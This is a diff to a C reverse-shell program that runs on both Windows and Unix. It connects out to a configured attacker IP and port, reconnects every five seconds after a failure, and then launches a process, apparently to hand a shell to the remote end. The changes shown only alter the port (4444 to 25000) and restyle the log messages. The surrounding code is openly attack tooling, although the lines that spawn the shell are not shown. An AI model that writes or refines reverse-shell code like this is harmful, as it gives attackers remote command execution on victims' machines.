@@ -19,7 +19,7 @@
 #endif
 
 const char* ATTACKERIP = "127.0.0.1";
-const int ATTACKERPORT = 4444;
+const int ATTACKERPORT = 25000;
 
 int main() {
 #if defined(_WIN32) || defined(WIN32)
@@ -35,7 +35,7 @@ int main() {
 #if defined(_WIN32) || defined(WIN32)
         SOCKETTYPE s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
         if (s == INVALID_SOCKET) {
-            printf("server seems down. reconnecting...\n");
+            printf("[!] server seems down. reconnecting...\n");
             SLEEP(5000);
             continue;
         }
@@ -47,12 +47,12 @@ int main() {
 
         if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
             CLOSESOCKET(s);
-            printf("server seems down. reconnecting...\n");
+            printf("[!] server seems down. reconnecting...\n");
             SLEEP(5000);
             continue;
         }
 
-        printf("Connected to %s:%d\n", ATTACKERIP, ATTACKERPORT);
+        printf("[+] connected to %s:%d\n", ATTACKERIP, ATTACKERPORT);
 
         STARTUPINFO si;
         PROCESS_INFORMATION pi;
@@ -74,7 +74,7 @@ int main() {
 #else
         int s = socket(AF_INET, SOCK_STREAM, 0);
         if (s < 0) {
-            printf("server seems down. reconnecting...\n");
+            printf("[!] server seems down. reconnecting...\n");
             SLEEP(5000);
             continue;
         }
@@ -86,12 +86,12 @@ int main() {
 
         if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
             CLOSESOCKET(s);
-            printf("server seems down. reconnecting...\n");
+            printf("[!] server seems down. reconnecting...\n");
             SLEEP(5000);
             continue;
         }
 
-        printf("Connected to %s:%d\n", ATTACKERIP, ATTACKERPORT);
+        printf("[+] connected to %s:%d\n", ATTACKERIP, ATTACKERPORT);
 
         pid_t pid = fork();
         if (pid == 0) {
@@ -107,7 +107,7 @@ int main() {
 
         CLOSESOCKET(s);
 #endif
-        printf("server seems down. reconnecting...\n");
+        printf("[+] server seems down. reconnecting...\n");
         SLEEP(5000);
     }
 
